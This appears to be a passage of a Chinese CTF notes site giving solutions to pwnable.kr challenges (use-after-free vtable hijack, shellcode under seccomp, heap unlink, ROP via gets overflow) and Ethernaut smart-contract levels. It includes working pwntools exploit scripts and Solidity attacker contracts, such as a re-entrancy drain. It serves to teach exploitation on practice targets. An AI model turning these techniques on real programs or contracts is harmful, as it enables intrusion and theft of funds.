#shell.download_file('./cmd1.c') sh = shell.run('./cmd1 \"/bin/cat fl*\" ') sh.interactive() 0x0F cmd2 算是cmd1的进阶版本 #include #include int filter(char* cmd){ int r=0; r += strstr(cmd, \"=\")!=0; r += strstr(cmd, \"PATH\")!=0; r += strstr(cmd, \"export\")!=0; r += strstr(cmd, \"/\")!=0; r += strstr(cmd, \"`\")!=0; r += strstr(cmd, \"flag\")!=0; return r; } extern char** environ; void delete_env(){ char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p)); } int main(int argc, char* argv[], char** envp){ delete_env(); putenv(\"PATH=/no_command_execution_until_you_become_a_hacker\"); if(filter(argv[1])) return 0; printf(\"%s\\n\", argv[1]); system( argv[1] ); return 0; } 这次连斜杠都给过滤了。。。 但是 bash里可以用 $()取值 比如我们cd 到根目录 $(pwd)就相当于斜杠了 然后就可以绕过了 还有一个坑点是 不能用“”包裹参数了 因为如下 bash里面关于单引号，双引号，反斜杠的处理 字符 说明 ’(单引号) 又叫硬转义，其内部所有的shell 元字符、通配符都会被关掉。注意，硬转义中不允许出现’(单引号) “”(双引号) 又叫软转义，其内部只允许出现特定的shell 元字符：$用于参数代换 `用于命令代替 \\(反斜杠) 又叫转义，去除其后紧跟的元字符或通配符的特殊意义。 Exp: #coding=utf-8 from pwn import * shell=ssh(host='pwnable.kr',user='cmd1',password='guest',port=2222) #shell.download_file('./cmd1.c') sh = shell.run('./cmd1 \"/bin/cat fl*\" ') sh.interactive() 0x10 uaf 前置知识：类重载·虚函数 在cpp中，如果类中有虚函数，那么它就会有一个虚函数表的指针__vfptr，在类对象最开始的内存数据中。之后是类中的成员变量的内存数据。 对于子类，最开始的内存数据记录着父类对象的拷贝（包括父类虚函数表指针和成员变量）。 之后是子类自己的成员变量数据。 如果一个类中有虚函数，那么就会建立一张虚函数表vtable，子类继承父类vtable，若，父类的vtable中私有(private)虚函数,则子类vtable中同样有该私有(private)虚函数的地址。注意这并不是直接继承了私有(private)虚函数 当子类重载父类虚函数时，修改vtable同名函数地址，改为指向子类的函数地址，若子类中有新的虚函数，在vtable尾部添加。 vptr每个对象都会有一个，而vptable是每个类有一个，vptr指向vtable，一个类中就算有多个虚函数，也只有一个vptr；做多重继承的时候，继承了多个父类，就会有多个vptr 作者：看雪学院 链接：https://www.jianshu.com/p/a66adda1d0be 来源：简书 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 单一继承，无虚函数重载 单一继承，重载了虚函数 所以在本题中，我们可以通过修改Man类重载的虚函数地址指向从Human拷贝过来的give_shell函数 gdb-peda$ file uaf Reading symbols from uaf...(no debugging symbols found)...done. gdb-peda$ b *0x0000000000400F13 #new man的函数地址 在ida 中可看到 Breakpoint 1 at 0x400f13 gdb-peda$ r Starting program: /root/codes/pwnable.kr/uaf [----------------------------------registers-----------------------------------] RAX: 0x614ea0 --> 0x0 RBX: 0x614ea0 --> 0x0 RCX: 0x614eb0 --> 0x0 RDX: 0x19 RSI: 0x7ffffffee180 RDI: 0x614ea0 --> 0x0 RBP: 0x7ffffffee1d0 RSP: 0x7ffffffee170 RIP: 0x400f13 --> 0x5d89480000034ce8 R8 : 0x614ea0 --> 0x0 R9 : 0x7fffff78afc0 --> 0x602210 --> 0x7fffff6649e0 (: )R10: 0x20 (' ') R11: 0x0 R12: 0x7ffffffee180 R13: 0x7ffffffee2b0 R14: 0x0 R15: 0x0 EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x400f08 : mov edx,0x19 0x400f0d : mov rsi,r12 0x400f10 : mov rdi,rbx => 0x400f13 : call 0x401264 0x400f18 : mov QWORD PTR [rbp-0x38],rbx 0x400f1c : lea rax,[rbp-0x50] 0x400f20 : mov rdi,rax 0x400f23 : call 0x400d00 Guessed arguments: arg[0]: 0x614ea0 --> 0x0 arg[1]: 0x7ffffffee180 arg[2]: 0x19 [------------------------------------stack-------------------------------------] Invalid $SP address: 0x7ffffffee170 [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0x0000000000400f13 in main () gdb-peda$ ni #执行一行源程序代码（汇编级别），此行代码中的函数调用也一并执行。 [----------------------------------registers-----------------------------------] RAX: 0x614ea0 --> 0x401570 --> 0x40117a (: push rbp) RBX: 0x614ea0 --> 0x401570 --> 0x40117a (: push rbp) RCX: 0x614eb0 --> 0x614e88 --> 0x6b63614a ('Jack') RDX: 0x19 RSI: 0x7ffffffee180 RDI: 0x7fffff7982e0 --> 0x0 RBP: 0x7ffffffee1d0 RSP: 0x7ffffffee170 RIP: 0x400f18 --> 0xb0458d48c85d8948 R8 : 0x614ea0 --> 0x401570 --> 0x40117a (: push rbp) R9 : 0x7fffff78afc0 --> 0x602210 --> 0x7fffff6649e0 (: )R10: 0x7fffff5f909d (\"_ZNSs6assignERKSs\") R11: 0x7fffff6a72c0 (: push r12) R12: 0x7ffffffee180 R13: 0x7ffffffee2b0 R14: 0x0 R15: 0x0 EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x400f0d : mov rsi,r12 0x400f10 : mov rdi,rbx 0x400f13 : call 0x401264 => 0x400f18 : mov QWORD PTR [rbp-0x38],rbx 0x400f1c : lea rax,[rbp-0x50] 0x400f20 : mov rdi,rax 0x400f23 : call 0x400d00 0x400f28 : lea rax,[rbp-0x12] [------------------------------------stack-------------------------------------] Invalid $SP address: 0x7ffffffee170 [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x0000000000400f18 in main () gdb-peda$ p /x $rbx #查看实例化的Man对象地址 $1 = 0x614ea0 gdb-peda$ x /10w 0x614ea0 #查看实例化的Man内存空间 虚表指针在首部 即 0x00401570 0x614ea0: 0x00401570 0x00000000 0x00000019 0x00000000 0x614eb0: 0x00614e88 0x00000000 0x0000f151 0x00000000 0x614ec0: 0x00000000 0x00000000 gdb-peda$ x /10 0x00401570 #查看虚表 结合ida 可发现 0x0040117a 存放的是 give_shell的函数地址 0x004012d2 存放的是man::introduce的函数地址 0x401570 : 0x0040117a 0x00000000 0x004012d2 0x00000000 0x401580 : 0x00000000 0x00000000 0x004015f0 0x00000000 0x401590 : 0x0040117a 0x00000000 Use-After-Free 当所指向的对象被释放或者收回，但是对该指针没有作任何的修改，以至于该指针仍旧指向已经回收的内存地址，此情况下该指针便称迷途指针。若操作系统将这部分已经释放的内存重新分配给另外一个进程，而原来的程序重新引用现在的迷途指针，则将产生无法预料的后果 具体过程如下图 分析源码 while(1){ cout > op; switch(op){ case 1: m->introduce(); w->introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout 根据uaf的原理，我们只需要先free 然后再利用after修改Dangling pointer指向的内存，然后再use一下就行，这里我们通过修改虚表指针，来利用源码中的后门give_shell() #coding=utf-8 from pwn import * shell=ssh(host='pwnable.kr',user='uaf',password='guest',port=2222) #shell.download_file(\"./uaf.cpp\") #shell.download_file(\"./uaf\") v_ptr=0x00401570 payload=v_ptr-0x8 #修改虚表指针 sh=shell.run('sh') sh.sendline('python -c \"print\" '+p64(payload)+'> /tmp/exp.txt') sh.sendline(\"./uaf 24 /tmp/exp.txt\")#Man 对象分配的堆空间是24个字节 sh.sendline(\"3\") sh.sendline(\"2\")#因为先free m再free w，所以为了再次拿到m所指向的空间，我们需要分配两次，第一次得到w所指向的空间，第二次才再次得到m所指向的空间 sh.sendline(\"2\") sh.sendlune(\"1\") sh.interactive() 参考资料 https://www.jianshu.com/p/a66adda1d0be https://zh.wikipedia.org/wiki/%E8%BF%B7%E9%80%94%E6%8C%87%E9%92%88 0x11 memcpy 看源码觉得，真的就随便输一下执行完实验就好了？ 但是随便输值得话会crash.... 问题出在 movntps 这条汇编指令上 Moves the packed double-precision floating-point values in the source operand (second operand) to the destination operand (first operand) using a non-temporal hint to prevent caching of the data during the write to memory. The source operand is an XMM register, YMM register or ZMM register, which is assumed to contain packed double-precision, floating-pointing data. The destination operand is a 128-bit, 256-bit or 512-bit memory location. The memory operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary otherwise a general-protection exception (#GP) will be generated. 要求16位对齐 观察malloc过程 malloc在分配内存时它实际上还会多分配4字节用于存储堆块信息，所以如果分配a字节实际上分配的是a+4字节。另外32位系统上该函数分配的内存是以8字节对齐的。 有了这两点就知道程序的异常退出是因为分配的内存没有16字节对齐，那么要让程序正常进行拿到flag只需要每次分配的内存地址能够被16整除就可以了。 （实际上由于malloc函数分配的内存8字节对齐，只要内存大小除以16的余数大于9就可以了）。 Exp #coding=utf-8 from pwn import * context.log_level = 'DEBUG' shell = ssh(host=\"pwnable.kr\",user=\"memcpy\",port=2222,password=\"guest\") io = shell.connect_remote(\"0.0.0.0\",9022) #io=process(\"./memcpy\") io.recvuntil(\"specify the memcpy amount between 8 ~ 16 :\") io.sendline('8') for i in range(9): payload = str(pow(2, i+4)+10) io.sendlineafter(': ', payload) io.interactive() 0x12 shellcode stub中的内容 python >>> from pwn import * >>> print disasm(\"\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\x31\\xff\\x48\\x31\\xed\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x4d\\x31\\xd2\\x4d\\x31\\xdb\\x4d\\x31\\xe4\\x4d\\x31\\xed\\x4d\\x31\\xf6\\x4d\\x31\\xff\") 0: 48 dec eax 1: 31 c0 xor eax, eax 3: 48 dec eax 4: 31 db xor ebx, ebx 6: 48 dec eax 7: 31 c9 xor ecx, ecx 9: 48 dec eax a: 31 d2 xor edx, edx c: 48 dec eax d: 31 f6 xor esi, esi f: 48 dec eax 10: 31 ff xor edi, edi 12: 48 dec eax 13: 31 ed xor ebp, ebp 15: 4d dec ebp 16: 31 c0 xor eax, eax 18: 4d dec ebp 19: 31 c9 xor ecx, ecx 1b: 4d dec ebp 1c: 31 d2 xor edx, edx 1e: 4d dec ebp 1f: 31 db xor ebx, ebx 21: 4d dec ebp 22: 31 e4 xor esp, esp 24: 4d dec ebp 25: 31 ed xor ebp, ebp 27: 4d dec ebp 28: 31 f6 xor esi, esi 2a: 4d dec ebp 2b: 31 ff xor edi, edi 将所有寄存器清零 对我们写shellcode看起来没有啥影响 注意到源码对可用的指令做了限制 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); 只能使用这些指令。。。 可以利用pwntool的shellcraft来快速编写shellcode Exp #coding=utf-8 from pwn import * context(arch=\"amd64\",os=\"Linux\",log_level=\"DEBUG\") shell = ssh(host=\"pwnable.kr\",user=\"asm\",port=2222,password=\"guest\") #shell.download_file(\"./asm.c\") io = shell.connect_remote(\"0.0.0.0\",9026) filename=\"this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\" shellcode=\"\" shellcode+=shellcraft.open(filename)#打开文件到 rax(返回值) shellcode+=shellcraft.read('rax','rsp',100)#读文件 100个字节 到栈上 (rsp) shellcode+=shellcraft.write(1,'rsp',100)#从rsp 写到stdout=1 (stdin=0) print shellcode io.sendafter(\"give me your x64 shellcode:\",asm(shellcode)) io.interactive() 附一张x64各寄存器用途 Register 状态 请使用 RAX 易失的 返回值寄存器 RCX 易失的 第一个整型参数 RDX 易失的 第二个整型参数 R8 易失的 第三个整型参数 R9 易失的 第四个整型参数 R10:R11 易失的 必须根据需要由调用方保留；在 syscall/sysret 指令中使用 R12:R15 非易失的 必须由被调用方保留 RDI 非易失的 必须由被调用方保留 RSI 非易失的 必须由被调用方保留 RBX 非易失的 必须由被调用方保留 RBP 非易失的 可用作帧指针；必须由被调用方保留 RSP 非易失的 堆栈指针 XMM0 易失的 第一个 FP 参数 XMM1 易失的 第二个 FP 参数 XMM2 易失的 第三个 FP 参数 XMM3 易失的 第四个 FP 参数 XMM4:XMM5 易失的 必须根据需要由调用方保留 XMM6:XMM15 非易失的 必须根据需要由被调用方保留。 0x13 unlink 考察堆溢出和DWORD SHOOT操作 前置知识 DWORD SHOOT unlink正常情况下的操作示意图 void unlink(OBJ* P){ OBJ* BK; OBJ* FD; BK=P->bk;//如果bk已经被恶意覆盖了呢 比如一个4字节的恶意数据 FD=P->fd;//如果fd已经被恶意覆盖了呢 比如一个内存地址 FD->bk=BK;//那么FD指向的地址的bk会被BK的恶意数据覆盖 BK->fd=FD; } 既然我们已经拿到shell后门的地址了，不难想到可以通过 FD->bk=BK 将 shell 函数的起始地址写到返回地址上 void unlink(OBJ* P){ OBJ* BK; OBJ* FD; BK=P->bk;//bk是shell的地址 FD=P->fd; FD->bk=BK;//那么FD指向的地址的bk会被BK的恶意数据覆盖 BK->fd=FD;//但是BK(shell)的内容会在此处被覆盖 } 如果是利用堆溢出指向堆上的一段shellcode checksec发现程序有NX保护。。。。 看大佬的wp找到一点思路 在汇编代码的最后一段 .text:080485FF mov ecx, [ebp+var_4] .text:08048602 leave .text:08048603 lea esp, [ecx-4] .text:08048606 retn retn指令相当于pop eip，该指令是可以控制程序运行流程的，流程的来源是esp指向的地址。 而再之前 lea esp，[ecx-4]即把ecx-4地址中的数据赋给esp。 而在此逆推ecx的值是从mov ecx,[ebp-4]中得到的。 而leave指令相当于mov esp ebp，pop ebp，对esp数据的来源无影响。 ebp在整个main函数运行中是不变的。 因此，可以构造 [ecx-4] = shell的起始地址 这样 就可以先把 shell的起始地址写到一个内存地址（如可以在A->buf的起始部分输入shell函数地址），ecx再指向该地址+4. 进一步就是将ebp-4地址中的值覆写成上面的地址+4. 大致就是利用unlink对地址[ecx-4]进行任意写（shell） 然后retn的时候利用 A,B,C在栈上的位置可从ida中看出 A // [esp+4h] [ebp-14h] B // [esp+Ch] [ebp-Ch] C // [esp+8h] [ebp-10h] ebp可以从汇编代码中算出 .text:08048555 call _malloc .text:0804855A add esp, 10h .text:0804855D mov [ebp+var_14], eax 结合反汇编得到的代码可以得到 ebp-0x14=&A=stack_addr 这样如何解决之前的覆盖问题呢 一种方法是 当BK = ebp-4时，FD + 4 = shell +4 ，FD = shell, 覆写时，[shell+4] = ebp-4 void unlink(OBJ* P){ OBJ* BK; OBJ* FD; BK=P->bk;//bk是[ebp-4]=[ebp-4] 也即 stack_addr+0x14-0x4 FD=P->fd;//fd指向ecx=(shell_addr+4) 也即 (heap_addr+0x8)+0x4 FD->bk=BK;//此时FD->bk=ecx+4 无影响 BK->fd=FD;//此时BK->fd=ecx=(shell_addr+4) } Exp #coding=utf-8 from pwn import * context(arch='amd64',os='linux',log_level=\"DEBUG\") shell=ssh(host='pwnable.kr',user='unlink',password='guest',port=2222) #shell.download_file(\"./unlink.c\") #shell.download_file(\"./unlink\") io=shell.run(\"./unlink\") shell_addr=0x080484EB re=io.recvline() stack_addr=int(re.split(\":\")[1],16) # &A re=io.recvline() heap_addr=int(re.split(\":\")[1],16) # A io.recvline() ''' typedef struct tagOBJ{ struct tagOBJ* fd;//4 byte struct tagOBJ* bk;//4 byte char buf[8];//8 byte }OBJ; ''' payload = p32(shell_addr)#(A->buf(0~3)) payload +=\"a\"*(0x4+0x8)#(A->buf(4~7)+padding(0x08)) payload += p32(heap_addr+0x8+0x4)#(B->fd) payload += p32(stack_addr+0x14-0x4)#(B->bk) #print hex(stack_addr)+\" \"+hex(heap_addr) io.send(payload) io.interactive() 参考资料： https://bbs.pediy.com/thread-247883.htm https://introspelliam.github.io/2017/06/26/0day/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%8A%EF%BC%89%E2%80%94%E2%80%94DWORD-SHOOT/ https://www.cnblogs.com/p4nda/p/7172104.html https://blog.csdn.net/Apollon_krj/article/details/51302859 0x14 blukat 好绝一题 分析源码发现没有溢出点，难道真的只能爆破password? 然后ls -al 看了一下 blukat@prowl:~$ ls -al total 36 drwxr-x--- 4 root blukat 4096 Aug 16 2018 . drwxr-xr-x 116 root root 4096 Nov 12 21:34 .. -r-xr-sr-x 1 root blukat_pwn 9144 Aug 8 2018 blukat -rw-r--r-- 1 root root 645 Aug 8 2018 blukat.c dr-xr-xr-x 2 root root 4096 Aug 16 2018 .irssi -rw-r----- 1 root blukat_pwn 33 Jan 6 2017 password drwxr-xr-x 2 root root 4096 Aug 16 2018 .pwntools-cache 可以看到 password是可读的。。。。。 但是这个回显导致一开始根本没去想。。。。 blukat@prowl:~$ cat password cat: password: Permission denied #一般是权限不足的正常回显。。。。 后来发现password是可以scp下下来的，也就是说password里面就是这个字符串。。。。 输入即可 Exp #coding=utf-8 from pwn import * context(arch=\"amd64\",os=\"Linux\",log_level=\"DEBUG\") shell = ssh(host=\"pwnable.kr\",user=\"blukat\",port=2222,password=\"guest\") shell.download_file(\"./password\") io=shell.run(\"./blukat\") io.sendlineafter(\"guess the password!\",\"cat: password: Permission denied\") io.interactive() 0x15 horcruxes 逆向后核心源码 int ropme() { char s[100]; // [esp+4h] [ebp-74h] int v2; // [esp+68h] [ebp-10h] int fd; // [esp+6Ch] [ebp-Ch] printf(\"Select Menu:\"); __isoc99_scanf(\"%d\", &v2); getchar(); if ( v2 == a ) A(); else if ( v2 == b ) B(); else if ( v2 == c ) C(); else if ( v2 == d ) D(); else if ( v2 == e ) E(); else if ( v2 == f ) F(); else if ( v2 == g ) G(); else { printf(\"How many EXP did you earned? : \"); gets(s);//存在栈溢出 if ( atoi(s) == sum ) { fd = open(\"flag\", 0); s[read(fd, s, 0x64u)] = 0; puts(s); close(fd); exit(0); } puts(\"You'd better get more experience to kill Voldemort\"); } return 0; } 题目思路是拿到a,b,c,d,e,f,g的值，来得到flag a,b,c,d,e,f,g随机 直接绕过判断是不行的，main里的seccomp把可绕过的地址都封死了 还是利用gets栈溢出，去调用A,B,C,D,E,F,G的函数来得到对应值，然后再跳回来输入对应的EXP Exp #coding=utf-8 from pwn import * context(arch=\"amd64\",os=\"Linux\",log_level=\"DEBUG\") shell = ssh(host=\"pwnable.kr\",user=\"horcruxes\",port=2222,password=\"guest\") #shell.download_file(\"./horcruxes\") io=shell.connect_remote(\"0.0.0.0\",9032) payload=\"1\" #io.sendlineafter(\"guess the password!\",\"cat: password: Permission denied\") io.recv() io.sendline(payload) a_addr=0x0809FE4B b_addr=0x0809FE6A c_addr=0x0809FE89 d_addr=0x0809FEA8 e_addr=0x0809FEC7 f_addr=0x0809FEE6 g_addr=0x0809FF05 call_ropme_addr=0x0809FFFC payload='a'*(0x74+0x4)+p32(a_addr)+p32(b_addr)+p32(c_addr)+p32(d_addr)+p32(e_addr)+p32(f_addr)+p32(g_addr)+p32(call_ropme_addr) #当函数A()执行结束之后，执行return指令的地址应就是后4个bytes，所以直接将地址罗列在padding数据之后，函数会一个一个的进行跳转 io.sendlineafter(\"How many EXP did you earned? :\",payload) exp=0 io.recvline() for i in range(7): re = io.recvline() u = int(re.strip('\\n').split('+')[1][:-1]) print u exp += u print \"Exp: \"+str(exp) io.sendlineafter(\"Select Menu:\",\"1\") io.sendlineafter(\"How many EXP did you earned? :\",str(exp)) io.interactive() 一个坑点是： ropme的地址是0x080A0009 有个0xA0 相当于换行符 所以会被gets截断，所以绕一步用main里call ropme的地址做替换 另一个坑点是： atoi函数将int转化为字符串，如果数字超过int范围转化失败返回-1，所以要多试几遍才能出flag..... © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"ethernaut/":{"url":"ethernaut/","title":"Ethernaut","keywords":"","body":"Ethernaut Write UpHELLO ETHERNAUTFALLBACKFALLOUTCOIN FLIPTelephoneDelegationForceVaultKingRe-entrancyElevatorPrivacyGateKeeperTwoNaught CoinMagic NumberEthernaut Write Up HELLO ETHERNAUT 基本的交互操作 打开F12跟着指引就行 FALLBACK 大概就是满足条件就可以调用函数成为owner，所以打点钱就好了 FALLOUT Constructor 写错了 pragma solidity ^0.4.18; import 'zeppelin-solidity/contracts/ownership/Ownable.sol'; import 'openzeppelin-solidity/contracts/math/SafeMath.sol'; contract Fallout is Ownable { using SafeMath for uint256; mapping (address => uint) allocations; /* constructor */ function Fal1out() public payable {//这里是l1 不是ll 导致我们可以调用这个函数成为owner owner = msg.sender; allocations[owner] = msg.value; } function allocate() public payable { allocations[msg.sender] = allocations[msg.sender].add(msg.value); } function sendAllocation(address allocator) public { require(allocations[allocator] > 0); allocator.transfer(allocations[allocator]); } function collectAllocations() public onlyOwner { msg.sender.transfer(this.balance); } function allocatorBalance(address allocator) public view returns (uint) { return allocations[allocator]; } } COIN FLIP pragma solidity ^0.4.18; contract CoinFlip { uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = uint256(uint256(blockValue) / FACTOR); bool side = coinFlip == 1 ? true : false; if (side == _guess) { consecutiveWins++; return true; } else { consecutiveWins = 0; return false; } } } contract Attacker { CoinFlip fliphack; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function Attacker(address target_address) { fliphack = CoinFlip(target_address); } function hack() public { uint256 blockValue = uint256(block.blockhash(block.number-1)); uint256 coinFlip = uint256(uint256(blockValue) / FACTOR); bool predict = coinFlip == 1 ? true : false; fliphack.flip(predict); } } 部署后执行hack十次即可 Telephone 利用tx.origin和msg.sender的区别 With msg.sender the owner can be a contract. With tx.origin the owner can never be a contract. In a simple call chain A->B->C->D, inside D msg.sender will be C, and tx.origin will be A. 所以我们只要部署一个合约去调用题目的合约就可以使得tx.origin!=msg.sender pragma solidity ^0.6.0; contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } contract Attacker { address target; constructor(address p) public{ target = p; } function hack() public{ Telephone a = Telephone(target); a.changeOwner(msg.sender); } } Delegation 源码如下 pragma solidity ^0.6.0; contract Delegate { address public owner; constructor(address _owner) public { owner = _owner; } function pwn() public { owner = msg.sender; } } contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) public { delegate = Delegate(_delegateAddress); owner = msg.sender; } fallback() external { (bool result, bytes memory data) = address(delegate).delegatecall(msg.data); if (result) { this; } } 这里Delegation调用了Delegate合约,在其fallback函数中 使用了delegatecall 考点在于 Solidity 中支持两种底层调用方式 call和 delegatecall call 外部调用时，上下文是外部合约 delegatecall 外部调用时，上下文是调用合约 也就是说通过address(delegate).delegatecall(msg.data);我们能调用delegate的任意函数 这里我们发现只要调用delegate的pwn()函数就好了 在solidty中可以通过method id（函数选择器）来调用函数，比如pwn函数的method id就是keccak256(\"pwn()\"))取前四个字节，在 web3 中 sha3就是 keccak256，所以有如下exp： await contract.sendTransaction({data: web3.utils.sha3(\"pwn()\").slice(0,10)}); Force 题目要求使合约 balance 大于 0 但是显然合约没有任何接收钱的方法 这里使用合约的自毁强制给题目的合约转账 pragma solidity ^0.4.18; contract Attacker { function Attacker() payable{} function hack(address target) public { selfdestruct(target); } } 给合约转点eth然后调用hack自毁 Vault pragma solidity ^0.6.0; contract Vault { bool public locked; bytes32 private password; constructor(bytes32 _password) public { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } } } 区块链上的信息是完全公开的 private 变量不能被别的合约访问， 但是可以通过web3的getStorage函数获取到。 可以利用下面这个poc 得到合约实例instance的任意块 function getStorageAt (address, idx) { return new Promise (function (resolve, reject) { web3.eth.getStorageAt(address, idx, function (error, result) { if (error) { reject(error); } else { resolve(result); } }) })} 我们要的是第一块（从第0块开始计算） await getStorageAt(instance, 1); web3.utils.hexToAscii就能看到密码 但是我们需要以bytes32的形式输入，也即 contract.unlock(\"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\") King 源码如下 pragma solidity ^0.6.0; contract King { address payable king; uint public prize; address payable public owner; constructor() public payable { owner = msg.sender; king = msg.sender; prize = msg.value; } fallback() external payable { require(msg.value >= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; } function _king() public view returns (address payable) { return king; } } 题目要求始终为King，那么只要在成为King后阻止下一笔交易即可 可以编写一个没有payable修饰的fallback的合约这样就可以阻止king.transfer执行 pragma solidity ^0.4.18; contract Attacker{ constructor(address target) public payable{ target.call.gas(1000000).value(msg.value)(); } } Re-entrancy Exp pragma solidity ^0.4.18; contract Reentrance { mapping(address => uint) public balances; function donate(address _to) public payable { balances[_to] += msg.value; } function balanceOf(address _who) public view returns (uint balance) { return balances[_who]; } function withdraw(uint _amount) public { if(balances[msg.sender] >= _amount) { if(msg.sender.call.value(_amount)()) { //问题在于这里 调用了 sender 如果sender的fallback也withdraw（此时balance尚未被修改） 就会造成递归重入攻击 _amount; } balances[msg.sender] -= _amount; } } function() public payable {} } //编写如下合约 contract Attacker { address instance_address = instance_address; Reentrance target = Reentrance(instance_address); uint public amount = 1 ether; function Attack() payable{} function donate() public payable { target.donate.value(amount).gas(4000000)(address(this)); } function get_balance() public view returns(uint) { return target.balanceOf(this); } function my_balance() public view returns(uint) { return address(this).balance; } function target_balance() public view returns(uint) { return instance_address.balance; } function hack() public { target.withdraw(0.5 ether); } function retrive() public { selfdestruct(player_address); } function () public payable { target.withdraw(0.5 ether); } } 所以我们创建合约给Reentrance转1eth，然后再退款0.5eth，合约就会调用我们的fallback不断退款0.5eth，最终退到0eth完成攻击 Elevator 只要编写一个第一次返回false，第二次返回true的islastFoor()就行了 pragma solidity ^0.6.0; interface Building { function isLastFloor(uint) external returns (bool); } contract Elevator { bool public top; uint public floor; function goTo(uint _floor) public { Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) { floor = _floor; top = building.isLastFloor(floor); } } } contract Attacker is Building{ bool public lastFloor = true; function isLastFloor(uint) override external returns (bool){ lastFloor = !lastFloor; return lastFloor; } function go(address p)public{ Elevator target = Elevator(p); target.goTo(1024); } } Privacy 和Vault那题差不多，我们可以得到链上的所有数据，只要找到密码就行了 pragma solidity ^0.6.0; contract Privacy { bool public locked = true; uint256 public ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(now); bytes32[3] private data; constructor(bytes32[3] memory _data) public { data = _data; } function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } /* A bunch of super advanced solidity algorithms... ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^` .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*., *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^ ,---/V\\ `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*. ~|__(o.o) ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*' UU UU */ } await getStorageAt(contract.address,0) \"0x0000000000000000000000000000000000000000000000000000000000000001\" await getStorageAt(contract.address,1) \"0x000000000000000000000000000000000000000000000000000000006038b197\" await getStorageAt(contract.address,2) \"0x00000000000000000000000000000000000000000000000000000000b197ff0a\" await getStorageAt(contract.address,3) \"0xb6bc9f153154dff759f623ce8256aacfd7b14484f05a6c703d51c73f0451d29a\" await getStorageAt(contract.address,4) \"0xe213d07e42d82c8128979b3a012a875ab2155b5fb0ad63a16affff197c581ee4\" await getStorageAt(contract.address,5) \"0x9550a97555a5da445052aa4d6f448148de4464404672366088720800427c52b9\" await getStorageAt(contract.address,6) \"0x0000000000000000000000000000000000000000000000000000000000000000\" await getStorageAt(contract.address,7) \"0x0000000000000000000000000000000000000000000000000000000000000000\" 一块32字节 根据 Solidity 优化规则，当变量所占空间小于 32 字节时，会与后面的变量共享空间，如果加上后面的变量也不超过 32 字节的话。 对应 bool public locked = true; //\"0x0000000000000000000000000000000000000000000000000000000000000001\" uint256 public ID = block.timestamp; //\"0x000000000000000000000000000000000000000000000000000000006038b197\" uint8 private flattening = 10; //1 uint8 private denomination = 255;//1 uint16 private awkwardness = uint16(now);//2 //\"0x00000000000000000000000000000000000000000000000000000000b197ff0a\" bytes32[3] private data; //\"0xb6bc9f153154dff759f623ce8256aacfd7b14484f05a6c703d51c73f0451d29a\" //\"0xe213d07e42d82c8128979b3a012a875ab2155b5fb0ad63a16affff197c581ee4\" //\"0x9550a97555a5da445052aa4d6f448148de4464404672366088720800427c52b9\" 所以data[2]=\"0x9550a97555a5da445052aa4d6f448148de4464404672366088720800427c52b9\" byte16(data[2])就是data[2]的前16个字节 contract.unlock(\"0x9550a97555a5da445052aa4d6f448148\") GateKeeperTwo pragma solidity ^0.6.0; contract GatekeeperTwo { address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _; } modifier gateTwo() { uint x; assembly { x := extcodesize(caller()) } require(x == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } gateOne写合约就行 